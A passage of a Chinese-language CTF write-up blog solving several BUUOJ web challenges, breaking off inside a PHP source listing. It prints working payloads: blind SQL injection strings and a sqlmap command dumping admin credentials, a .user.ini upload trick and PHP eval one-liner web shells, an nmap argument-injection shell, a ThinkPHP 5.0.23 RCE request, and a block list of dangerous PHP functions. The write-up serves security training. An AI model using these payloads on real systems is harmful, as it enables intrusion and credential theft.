class="" title="image-20201129213121552" loading="lazy"><p>成功</p><hr><h2 id="Black-Watch-入群题-Web"><a href="#Black-Watch-入群题-Web" class="headerlink" title="[Black Watch 入群题]Web"></a>[Black Watch 入群题]Web</h2><p>打开</p><img src="/article/Buuoj-WEB-Write-up/image-20201202104315913.png" class="" title="image-20201202104315913" loading="lazy"><p>有登陆，尝试登陆界面sql注入</p><img src="/article/Buuoj-WEB-Write-up/image-20201202104343337.png" class="" title="image-20201202104343337" loading="lazy"><p>查看源码，在webpack发现猫腻</p><img src="/article/Buuoj-WEB-Write-up/image-20201202104718292.png" class="" title="image-20201202104718292" loading="lazy"><p>登录界面注入无果<img src="/article/Buuoj-WEB-Write-up/image-20201202104751986.png" class="" title="image-20201202104751986" loading="lazy"></p><p>转<code>content_list.php</code></p><p>发现请求文章时会带id参数，尝试注入</p><img src="/article/Buuoj-WEB-Write-up/image-20201202105153401.png" class="" title="image-20201202105153401" loading="lazy"><img src="/article/Buuoj-WEB-Write-up/image-20201202105351447.png" class="" title="image-20201202105351447" loading="lazy"><p>确认存在注入</p><p>过滤了<code>+</code> <code>空格</code> <code>and</code></p><img src="/article/Buuoj-WEB-Write-up/image-20201202105230126.png" class="" title="image-20201202105230126" loading="lazy"><p> 输入数据库不存在的id或产生语法时没有回显，初步判断为布尔盲注</p><h5 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h5><p>写个tamper替换空格等字符</p><pre class="language-bash" data-language="bash"><code class="language-bash">python2 sqlmap.py <span class="token parameter variable">-u</span> <span class="token string">"http://49a772d8-a3af-40d4-89c2-eaa7bc0fb974.node3.buuoj.cn/backend/content_detail.php?id=0"</span>  <span class="token parameter variable">--delay</span><span class="token operator">=</span><span class="token number">0.07</span> <span class="token parameter variable">--dbms</span><span class="token operator">=</span>mysql <span class="token parameter variable">--technique</span><span class="token operator">=</span>B <span class="token parameter variable">--tamper</span><span class="token operator">=</span>mytamper.py --user-agent<span class="token operator">=</span><span class="token string">"chrome"</span> <span class="token parameter variable">--risk</span><span class="token operator">=</span><span class="token number">3</span> <span class="token parameter variable">--dump</span></code></pre><p>参数：</p><pre class="language-none"><code class="language-none">--delay 延迟注入，网站快速注入会返回429，Too Many Requirements--dbms 数据库类型--technique 注入方式，这里B指bool布尔盲注--tamper 使用的tamper--user-agent 题目判断UA--risk 风险等级--dump 数据库全部拖下来</code></pre><p>运行提示</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> GET parameter <span class="token string">'id'</span> appears to be <span class="token string">'OR boolean-based blind - WHERE or HAVING clause'</span> injectable</code></pre><p>证实为布尔盲注</p><img src="/article/Buuoj-WEB-Write-up/image-20201202110359111.png" class="" title="image-20201202110359111" loading="lazy"><p>发现跑出了数据库名<code>news</code>但跑不出表名</p><img src="/article/Buuoj-WEB-Write-up/image-20201202110529783.png" class="" title="image-20201202110529783" loading="lazy"><p>参考师傅的答案，写脚本开始跑</p><p>payload：</p><pre class="language-none"><code class="language-none">1^if((select(ascii(substr((select(database())),&#123;&#125;,1))&#x3D;&#123;&#125;)),1,0)^1#</code></pre><p>一段一段分析</p><pre class="language-none"><code class="language-none">database() : 数据库(select(database()) : 选择数据库substr函数 : 指截取参数1字符串，从参数2的位置开始截取参数3位substr((select(database())),&#123;&#125;,1) : 指从数据库名第&#123;&#125;的位置截取一位ascii(substr((select(database())),&#123;&#125;,1)) : 指转化为ASCII码值select : 如下图所示select(ascii(substr((select(database())),&#123;&#125;,1))&#x3D;&#123;&#125;) : select ascii&#x3D;&#123;&#125;，判断是否和某个ascii码值相等，如图if(a,1,0) : 相当于三目运算符 :? ,即 a:1?0^ : 异或符</code></pre><img src="/article/Buuoj-WEB-Write-up/image-20201202112853423.png" class="" title="image-20201202112853423" loading="lazy"><img src="/article/Buuoj-WEB-Write-up/image-20201202112804610.png" class="" title="image-20201202112804610" loading="lazy"><img src="/article/Buuoj-WEB-Write-up/image-20201202112928978.png" class="" title="image-20201202112928978" loading="lazy"><p>很明显，第一个<code>&#123;&#125;</code>指的是数据库名的第i位，第二个<code>&#123;&#125;</code>指对第i的ASCII码值进行比较</p><img src="/article/Buuoj-WEB-Write-up/image-20201202110930572.png" class="" title="image-20201202110930572" loading="lazy"><p>数据库名为<code>news</code>，继续跑表名</p><p>payload：</p><pre class="language-none"><code class="language-none">1^if((select(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(&#39;news&#39;)),&#123;&#125;,1))&#x3D;&#123;&#125;)),1,0)^1#</code></pre><img src="/article/Buuoj-WEB-Write-up/image-20201202113058557.png" class="" title="image-20201202113058557" loading="lazy"><p>再跑列名</p><p>payload：</p><pre class="language-none"><code class="language-none">1^if((select(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name)like(&#39;admin&#39;)),&#123;&#125;,1))&#x3D;&#123;&#125;)),1,0)^1#</code></pre><img src="/article/Buuoj-WEB-Write-up/image-20201202113123832.png" class="" title="image-20201202113123832" loading="lazy"><p>跑数据了</p><p>payload：</p><pre class="language-none"><code class="language-none">1^if((select(ascii(substr((select(group_concat(id))from(admin)),&#123;&#125;,1))&#x3D;&#123;&#125;)),1,0)^1#1^if((select(ascii(substr((select(group_concat(username))from(admin)),&#123;&#125;,1))&#x3D;&#123;&#125;)),1,0)^1#1^if((select(ascii(substr((select(group_concat(password))from(admin)),&#123;&#125;,1))&#x3D;&#123;&#125;)),1,0)^1#1^if((select(ascii(substr((select(group_concat(is_enable))from(admin)),&#123;&#125;,1))&#x3D;&#123;&#125;)),1,0)^1#</code></pre><p>其实没必要跑那么多，（跑着好玩</p><p>出来表有两行</p><img src="/article/Buuoj-WEB-Write-up/image-20201202113806290.png" class="" title="image-20201202113806290" loading="lazy"><p><code>username</code>：3ab8d14c,dcaf5eed</p><img src="/article/Buuoj-WEB-Write-up/image-20201202114112390.png" class="" title="image-20201202114112390" loading="lazy"><p><code>password</code>：2a790c21,f285e92a</p><img src="/article/Buuoj-WEB-Write-up/image-20201202114324916.png" class="" title="image-20201202114324916" loading="lazy"><p><code>is_enable</code>：0,1</p><img src="/article/Buuoj-WEB-Write-up/image-20201202114435825.png" class="" title="image-20201202114435825" loading="lazy"><p>直接去拿enbale的登陆即可</p><p>表结构是这样的</p><p>数据库名:news</p><p>表名:admin</p><table><thead><tr><th>id</th><th>username</th><th>password</th><th>is_enable</th></tr></thead><tbody><tr><td>1</td><td>3ab8d14c</td><td>2a790c21</td><td>0</td></tr><tr><td>2</td><td>dcaf5eed</td><td>f285e92a</td><td>1</td></tr></tbody></table><p>登陆成功</p><img src="/article/Buuoj-WEB-Write-up/image-20201202114303580.png" class="" title="image-20201202114303580" loading="lazy"><hr><h2 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h2><h5 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h5><img src="/article/Buuoj-WEB-Write-up/image-20201203151206446.png" class="" title="image-20201203151206446" loading="lazy"><p>上来很直白，传个码看看</p><img src="/article/Buuoj-WEB-Write-up/image-20201203151245517.png" class="" title="image-20201203151245517" loading="lazy"><p>改后缀</p><img src="/article/Buuoj-WEB-Write-up/image-20201203151428059.png" class="" title="image-20201203151428059" loading="lazy">文件内容还检查，加`GIF98a`可以<img src="/article/Buuoj-WEB-Write-up/image-20201203151803538.png" class="" title="image-20201203151803538" loading="lazy"><p>会返回上传文件夹目录的数组，目录穿越上传不行，php过滤死了，传含码图片，过滤<code>&lt;?</code>，而<code>&lt;%</code>也不解析，路走不通。</p><p>传个<code>.htaccess</code></p><img src="/article/Buuoj-WEB-Write-up/image-20201203152651182.png" class="" title="image-20201203152651182" loading="lazy"><p>但是好像没解析…</p><img src="/article/Buuoj-WEB-Write-up/image-20201203152715211.png" class="" title="image-20201203152715211" loading="lazy"><p>经查询，nginx使用<code>.user.ini</code>自定义设置</p><p>于是传个<code>.user.ini</code></p><pre class="language-ini" data-language="ini"><code class="language-ini">.user.iniGIF89a                  //绕过exif_imagetype()<span class="token key attr-name">auto_prepend_file</span><span class="token punctuation">=</span><span class="token value attr-value">gyy.jpg //指定在主文件之前自动解析的文件的名称，并包含该文件，就像使用require函数调用它一样。它包含在所有php文件前先执行</span><span class="token key attr-name">auto_append_file</span><span class="token punctuation">=</span><span class="token value attr-value">gyy.jpg  //解析后进行包含，它包含在所有php文件执行后执行</span></code></pre><img src="/article/Buuoj-WEB-Write-up/image-20201203161427723.png" class="" title="image-20201203161427723" loading="lazy"><p>ok,再传码</p><img src="/article/Buuoj-WEB-Write-up/image-20201203161504788.png" class="" title="image-20201203161504788" loading="lazy"><p>然后直接访问<code>index.php</code>就可以了，因为<code>.user.ini</code>里写了，提前加载了<code>gyy.jpg</code>文件，而里面是我们写好的码，shell直接连上</p><img src="/article/Buuoj-WEB-Write-up/image-20201203161829593.png" class="" title="image-20201203161829593" loading="lazy"><hr><h2 id="RoarCTF-2019-Easy-Java"><a href="#RoarCTF-2019-Easy-Java" class="headerlink" title="[RoarCTF 2019]Easy Java"></a>[RoarCTF 2019]Easy Java</h2><p>记录一道特殊的题， 很简单的web题，但是需要对java容器和项目存放位置比较了解，作为web选手，应该要对几大语言的容器，项目环境，有所了解。</p><p>考点：<strong>WEB-INF&#x2F;web.xml泄露</strong></p><pre class="language-none"><code class="language-none">WEB-INF主要包含一下文件或目录:&#x2F;WEB-INF&#x2F;web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。&#x2F;WEB-INF&#x2F;classes&#x2F;：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中&#x2F;WEB-INF&#x2F;lib&#x2F;：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件&#x2F;WEB-INF&#x2F;src&#x2F;：源码目录，按照包名结构放置各个java文件。&#x2F;WEB-INF&#x2F;database.properties：数据库配置文件漏洞检测以及利用方法：通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码</code></pre><img src="/article/Buuoj-WEB-Write-up/image-20201208175741483.png" class="" title="image-20201208175741483" loading="lazy"><p>打开为登陆界面，SQL注入无果，点<code>help</code>，发现url变化为<code>./Download?filename=help.docx</code></p><p>猜测源码泄露，尝试伪协议读取源码<code>php://filter/convert.base64-encode/resource=help.docx</code>发现报错为<code>java.io.FileNotFoundException:&#123;php://filter/convert.base64-encode/resource=help.docx&#125;</code></p><p>结合题目名，猜测JAVA-WEB应用</p><p>报错是tomcat，尝试包含tomcat的web.xml，更改方式为POST请求，传参<code>filename=WEB-INF/web.xml</code></p><img src="/article/Buuoj-WEB-Write-up/image-20201208180232236.png" class="" title="image-20201208180232236" loading="lazy"><p>尝试请求<code>/Flag</code></p><img src="/article/Buuoj-WEB-Write-up/image-20201208180450678.png" class="" title="image-20201208180450678" loading="lazy"><p> 结合tomcat的项目存放路径经验试试下载FlagController.class </p><p>传参<code>filename=WEB-INF/classes/com/wm/ctf/FlagController.class</code></p><img src="/article/Buuoj-WEB-Write-up/image-20201208180558946.png" class="" title="image-20201208180558946" loading="lazy"><p>直接访问下载也行，抓包请求也行，base64解码一下发现flag</p><img src="/article/Buuoj-WEB-Write-up/image-20201208180825474.png" class="" title="image-20201208180825474" loading="lazy"><hr><h2 id="BUUCTF-2018-Online-Tool"><a href="#BUUCTF-2018-Online-Tool" class="headerlink" title="[BUUCTF 2018]Online Tool"></a>[BUUCTF 2018]Online Tool</h2><p>nmap工具的利用</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'HTTP_X_FORWARDED_FOR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REMOTE_ADDR'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'HTTP_X_FORWARDED_FOR'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'host'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$host</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'host'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$host</span> <span class="token operator">=</span> <span class="token function">escapeshellarg</span><span class="token punctuation">(</span><span class="token variable">$host</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$host</span> <span class="token operator">=</span> <span class="token function">escapeshellcmd</span><span class="token punctuation">(</span><span class="token variable">$host</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$sandbox</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"glzjin"</span><span class="token operator">.</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'you are in sandbox '</span><span class="token operator">.</span><span class="token variable">$sandbox</span><span class="token punctuation">;</span>    @<span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">chdir</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"nmap -T5 -sT -Pn --host-timeout 2 -F "</span><span class="token operator">.</span><span class="token variable">$host</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre><p>考两个函数<code>escapeshellarg</code></p><p> <strong>escapeshellcmd()</strong> 对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。 </p><p><code>escapeshellarg</code></p><p> <strong>escapeshellarg()</strong> 将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell 函数，并且还是确保安全的。 </p><p>然而之前就爆出了漏洞… 当先使用 escapeshellarg 再使用 escapeshellcmd 时，就可能导致命令参数注入。 </p><p>如</p><p><code>curl &#39;127.0.0.1&#39;\\&#39;&#39; -v -d a=1\&#39;</code></p><p>相当于<code>curl 127.0.0.1\ -v -d a=1&#39;</code></p><p>字符转义了</p><p>查阅nmap帮助手册<code>nmap -h</code></p><p>首先想读取文件，利用<code>-iL</code>参数</p><img src="/article/Buuoj-WEB-Write-up/image-20201208184745868.png" class="" title="image-20201208184745868" loading="lazy"><p>发现不行，cmd可以，但执行后没有回显，以下为本地环境</p><img src="/article/Buuoj-WEB-Write-up/image-20201208190824314.png" class="" title="image-20201208190824314" loading="lazy"><img src="/article/Buuoj-WEB-Write-up/image-20201208190921276.png" class="" title="image-20201208190921276" loading="lazy"><p>关键在于没法构造，毕竟两函数有转义的，于是有了另一种方法，输出。</p><p>利用<code>-oG</code>参数</p><img src="/article/Buuoj-WEB-Write-up/image-20201208184653935.png" class="" title="image-20201208184653935" loading="lazy"><p>直接写一句话木马就好了</p><p>payload&#x3D;<code>./?host=&#39;&lt;?php eval($_POST[gyy]);?&gt; -oG shell.php &#39;</code></p><p>最后和单引号要有空格，因为让system执行时最后的参数是<code>shell.php</code>而不是<code>shell.php\&#39;</code>，因为 <strong>escapeshellarg()<strong>和</strong>escapeshellcmd()</strong> 有转义，单引号是因为函数会检查字符串匹配引号的情况</p><img src="/article/Buuoj-WEB-Write-up/image-20201208193014462.png" class="" title="image-20201208193014462" loading="lazy"><p>查看文件</p><img src="/article/Buuoj-WEB-Write-up/image-20201208193048924.png" class="" title="image-20201208193048924" loading="lazy"><p>拿到shell</p><img src="/article/Buuoj-WEB-Write-up/image-20201208193135957.png" class="" title="image-20201208193135957" loading="lazy"><p>本地文件是这样的，可以看到包含了一句话木马</p><img src="/article/Buuoj-WEB-Write-up/image-20201208193533711.png" class="" title="image-20201208193533711" loading="lazy"><hr><h2 id="GKCTF2020-cve版签到"><a href="#GKCTF2020-cve版签到" class="headerlink" title="[GKCTF2020]cve版签到"></a>[GKCTF2020]cve版签到</h2><h5 id="cve-2020-7066"><a href="#cve-2020-7066" class="headerlink" title="cve-2020-7066"></a>cve-2020-7066</h5><p> <strong>将get_headers（）与用户提供的URL一起使用时</strong>，如果URL包含零（\ 0）字符，则URL将被静默地<strong>截断</strong>。<strong>这可能会导致某些软件对get_headers（）的目标做出错误的假设，并可能将某些信息发送到错误的服务器。</strong> </p><p>题目讲明为CVE，排除SSRF</p><p>在响应头中发现hint</p><img src="/article/Buuoj-WEB-Write-up/image-20201208195802041.png" class="" title="image-20201208195802041" loading="lazy"><p>访问<code>./?url=http://localhost%00www.ctfhub.com</code></p><img src="/article/Buuoj-WEB-Write-up/image-20201208195922474.png" class="" title="image-20201208195922474" loading="lazy"><p><code>Tips: Host must be end with &#39;123&#39;</code></p><p>访问<code>./?url=http://127.0.0.123%00www.ctfhub.com</code>即可</p><img src="/article/Buuoj-WEB-Write-up/image-20201208200037696.png" class="" title="image-20201208200037696" loading="lazy"><p>主要考一个CVE，记录一下</p><hr><h2 id="GXYCTF2019-禁止套娃"><a href="#GXYCTF2019-禁止套娃" class="headerlink" title="[GXYCTF2019]禁止套娃"></a>[GXYCTF2019]禁止套娃</h2><p>git泄露</p><p>一点提示都没有！可恶</p><p><code>robots.txt</code>没有，响应头没有，随手访问了个<code>./.git/</code>结果真有，直接上GitHack</p><img src="/article/Buuoj-WEB-Write-up/image-20201208202421537.png" class="" title="image-20201208202421537" loading="lazy"><p>强烈谴责！GitHack重新下个就好了，旧的这个还不管用，GitHack还有假的？？？</p><img src="/article/Buuoj-WEB-Write-up/image-20201208203755631.png" class="" title="image-20201208203755631" loading="lazy"><p>得到源码</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include</span> <span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"flag在哪里呢？&lt;br>"</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'exp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'exp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string single-quoted-string">';'</span> <span class="token operator">===</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[a-z,_]+\((?R)?\)/'</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'exp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/et|na|info|dec|bin|hex|oct|pi|log/i'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'exp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token comment">// echo $_GET['exp'];</span>                @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'exp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">else</span><span class="token punctuation">&#123;</span>                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"还差一点哦！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"再好好想想！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"还想读flag，臭弟弟！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">// highlight_file(__FILE__);</span><span class="token delimiter important">?></span></span></code></pre><p>很好，看到这个<code>&#39;;&#39; === preg_replace(&#39;/[a-z,_]+\((?R)?\)/&#39;, NULL, $_GET[&#39;exp&#39;]</code>妥妥的无参数RCE</p><p>过滤一堆</p><p>先扫当前目录</p><p>payload&#x3D;<code>./?exp=print_r(scandir(current(localeconv())));</code></p><pre class="language-bash" data-language="bash"><code class="language-bash">localeconv<span class="token punctuation">(</span><span class="token punctuation">)</span>: 返回一包含本地数字及货币格式信息的数组。如下图current<span class="token punctuation">(</span><span class="token punctuation">)</span>: 取数组中第一个元素，返回数组中的当前单元。current<span class="token punctuation">(</span>localeconv<span class="token punctuation">(</span><span class="token punctuation">))</span>: 取符号.scandir<span class="token punctuation">(</span><span class="token punctuation">)</span>: 扫描目录scandir<span class="token punctuation">(</span>current<span class="token punctuation">(</span>localeconv<span class="token punctuation">(</span><span class="token punctuation">))</span><span class="token punctuation">)</span>： 等同于scandir<span class="token punctuation">(</span>.<span class="token punctuation">)</span>，即扫描当前目录print_r<span class="token punctuation">(</span><span class="token punctuation">)</span>： 输出</code></pre><img src="/article/Buuoj-WEB-Write-up/image-20201208205457822.png" class="" title="image-20201208205457822" loading="lazy"><p>localeconv()如图所示</p><img src="/article/Buuoj-WEB-Write-up/image-20201208205704606.png" class="" title="image-20201208205704606" loading="lazy"><p>current(localeconv())取到了符号.</p><img src="/article/Buuoj-WEB-Write-up/image-20201208205956327.png" class="" title="image-20201208205956327" loading="lazy"><p>发现了flag.php</p><p>下面要取flag.php中的内容，flag.php在倒数第二组</p><p>由于没有禁用session，利用session<del>（我最喜欢</del></p><img src="/article/Buuoj-WEB-Write-up/image-20201208210427209.png" class="" title="~" loading="lazy"><p>其他方法</p><p>payload&#x3D;<code>./?exp=readfile(array_rand(array_flip(scandir(current(localeconv())))));</code></p><pre class="language-none"><code class="language-none">array_flip()： 交换数组的键和值array_rand()： 从数组中随机取出一个或多个单元readfile()： 读文件</code></pre><img src="/article/Buuoj-WEB-Write-up/image-20201208211502701.png" class="" title="image-20201208211502701" loading="lazy"><p>有点小运气嗷，可以写脚本跑，反正随机嘛…概率问题</p><p>读源码方法</p><pre class="language-none"><code class="language-none">file_get_contents()： 本题被banview-source:highlight_file()show_source()readfile()</code></pre><hr><h2 id="BJDCTF-2nd-old-hack"><a href="#BJDCTF-2nd-old-hack" class="headerlink" title="[BJDCTF 2nd]old-hack"></a>[BJDCTF 2nd]old-hack</h2><h5 id="thinkphp5-0-23-远程代码执行-漏洞"><a href="#thinkphp5-0-23-远程代码执行-漏洞" class="headerlink" title="thinkphp5.0.23 远程代码执行 漏洞"></a>thinkphp5.0.23 远程代码执行 漏洞</h5><p>payload：</p><p>POST</p><pre class="language-none"><code class="language-none">_method&#x3D;__construct&amp;filter[]&#x3D;system&amp;method&#x3D;get&amp;server[REQUEST_METHOD]&#x3D;cat &#x2F;flag</code></pre><hr><h2 id="网鼎杯-2020-朱雀组-phpweb"><a href="#网鼎杯-2020-朱雀组-phpweb" class="headerlink" title="[网鼎杯 2020 朱雀组]phpweb"></a>[网鼎杯 2020 朱雀组]phpweb</h2><img src="/article/Buuoj-WEB-Write-up/image-20201210190510038.png" class="" title="image-20201210190510038" loading="lazy"><p>打开一会发现网页自动刷新了，抓包看看</p><img src="/article/Buuoj-WEB-Write-up/image-20201210190602388.png" class="" title="image-20201210190602388" loading="lazy"><p>自动刷新</p><pre class="language-none"><code class="language-none">setTimeout(&quot;document.form1.submit()&quot;,5000)</code></pre><p>怀疑调用函数，尝试传参</p><pre class="language-none"><code class="language-none">func&#x3D;file_get_contents&amp;p&#x3D;index.php</code></pre><p>得到源码</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$disable_fun</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"exec"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"shell_exec"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"system"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"passthru"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"proc_open"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"show_source"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"phpinfo"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"popen"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"dl"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"eval"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"proc_terminate"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"touch"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"escapeshellcmd"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"escapeshellarg"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"assert"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"substr_replace"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"call_user_func_array"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"call_user_func"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"array_filter"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"array_walk"</span><span class="token punctuation">,</span>  <span class="token string double-quoted-string">"array_map"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"registregister_shutdown_function"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"register_tick_function"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"filter_var"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"filter_var_array"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"uasort"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"uksort"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"array_reduce"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"array_walk"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"array_walk_recursive"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"pcntl_exec"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"fopen"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"fwrite"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"file_put_contents"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">gettime</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span> <span class="token variable">$p</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span> <span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$a</span><span class="token operator">=</span> <span class="token function">gettype</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"string"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$result</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Test</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">var</span> <span class="token variable">$p</span> <span class="token operator">=</span> <span 